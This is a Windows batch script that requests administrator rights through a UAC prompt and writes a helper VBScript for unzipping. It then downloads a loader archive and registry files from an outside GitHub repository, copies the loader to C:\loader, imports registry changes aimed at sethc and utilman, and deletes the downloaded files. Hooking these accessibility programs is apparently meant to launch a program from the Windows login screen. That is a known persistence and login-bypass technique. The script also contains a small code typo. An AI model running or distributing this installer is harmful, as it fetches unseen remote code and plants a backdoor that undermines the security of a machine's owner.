@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:-------------------------------------- 
REM Changing working folder back to current directory for Vista & 7 compatibility
%~d0
CD %~dp0
REM Folder changed

REM This script upzip's files...

> j_unzip.vbs ECHO '
>> j_unzip.vbs ECHO ' UnZip a file script
>> j_unzip.vbs ECHO '
>> j_unzip.vbs ECHO ' By Justin Godden 2010
>> j_unzip.vbs ECHO '
>> j_unzip.vbs ECHO ' It's a mess, I know!!!
>> j_unzip.vbs ECHO '
>> j_unzip.vbs ECHO.
>> j_unzip.vbs ECHO ' Dim ArgObj, var1, var2
>> j_unzip.vbs ECHO Set ArgObj = WScript.Arguments
>> j_unzip.vbs ECHO.
>> j_unzip.vbs ECHO If (Wscript.Arguments.Count ^> 0) Then
>> j_unzip.vbs ECHO. var1 = ArgObj(0)
>> j_unzip.vbs ECHO Else
>> j_unzip.vbs ECHO. var1 = ""
>> j_unzip.vbs ECHO End if
>> j_unzip.vbs ECHO.
>> j_unzip.vbs ECHO If var1 = "" then
>> j_unzip.vbs ECHO. strFileZIP = "example.zip"
>> j_unzip.vbs ECHO Else
>> j_unzip.vbs ECHO. strFileZIP = var1
>> j_unzip.vbs ECHO End if
>> j_unzip.vbs ECHO.
>> j_unzip.vbs ECHO 'The location of the zip file.
>> j_unzip.vbs ECHO REM Set WshShell = CreateObject("Wscript.Shell")
>> j_unzip.vbs ECHO REM CurDir = WshShell.ExpandEnvironmentStrings("%%cd%%")
>> j_unzip.vbs ECHO Dim sCurPath
>> j_unzip.vbs ECHO sCurPath = CreateObject("Scripting.FileSystemObject").GetAbsolutePathName(".")
>> j_unzip.vbs ECHO strZipFile = sCurPath ^& "\" ^& strFileZIP
>> j_unzip.vbs ECHO 'The folder the contents should be extracted to.
>> j_unzip.vbs ECHO outFolder = sCurPath ^& "\"
>> j_unzip.vbs ECHO.
>> j_unzip.vbs ECHO. WScript.Echo ( "Extracting file " ^& strFileZIP)
>> j_unzip.vbs ECHO.
>> j_unzip.vbs ECHO Set objShell = CreateObject( "Shell.Application" )
>> j_unzip.vbs ECHO Set objSource = objShell.NameSpace(strZipFile).Items()
>> j_unzip.vbs ECHO Set objTarget = objShell.NameSpace(outFolder)
>> j_unzip.vbs ECHO intOptions = 256
>> j_unzip.vbs ECHO objTarget.CopyHere objSource, intOptions
>> j_unzip.vbs ECHO.
>> j_unzip.vbs ECHO. WScrip.Echo ( "Extracted." )
>> j_unzip.vbs ECHO.
>> j_unzip.vbs ECHO ' This bit is for testing purposes
>> j_unzip.vbs ECHO REM Dim MyVar
>> j_unzip.vbs ECHO REM MyVar = MsgBox ( strZipFile, 65, "MsgBox Example"   
REM --> Downloading App Loader
curl https://raw.githubusercontent.com/un-simp/utilman/built/loader.zip --output loader.zip
curl https://raw.githubusercontent.com/un-simp/utilman/built/sethc.reg --output sethc.reg
curl https://raw.githubusercontent.com/un-simp/utilman/built/utilman.reg --output utilman.reg
curl https://raw.githubusercontent.com/un-simp/utilman/main/uninstallsethcreplacer.cmd --output uninstallsethc.cmd
REM --> unzipping
cscript //B j_unzip.vbs loader.zip
xcopy loader C:\loader /E /H /C /I
xcopy uninstallsethc.cmd C:\ /E /H /C /I
REM --> setting reg keys
REG IMPORT utilman.reg
REG IMPORT sethc.reg
REM --> Clearing Temp Files
del j_unzip.vbs
del loader.zip
del utilman.reg
del sethc.reg
rmdir loader /S
pause
